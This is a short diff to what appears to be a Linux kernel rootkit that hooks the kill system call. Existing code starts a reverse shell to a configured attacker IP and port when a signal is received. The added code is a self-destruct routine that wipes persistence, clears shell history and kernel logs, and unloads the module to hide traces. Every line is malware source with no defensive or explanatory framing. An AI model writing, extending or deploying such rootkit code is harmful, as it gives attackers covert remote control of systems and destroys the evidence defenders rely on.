@@ -11,6 +11,7 @@
 #include "h_kill.h"
 #include "../hooking.h"
 #include "../revshell.h"
+#include "../selfdestruct.h"
 
 #define PF_INVISIBLE 0x10000000
 
@@ -53,6 +54,15 @@ int new_kill(const struct pt_regs *pt_regs)
         case SIGNAL_REVERSE_SHELL:
             start_reverse_shell(REVERSE_SHELL_IP, REVERSE_SHELL_PORT);
             printk(KERN_INFO "CALL REV SHELL WITH SIG");
+            break;
+        case TEST:
+            module_show();
+            kboom();
+            kboom_persistence();
+            flush_history();
+            flush_dmesg();
+            unload();
+            printk(KERN_INFO "CALL SELFDESTRUCT WITH SIG");
             break;
         default:
         return old_kill(pt_regs);
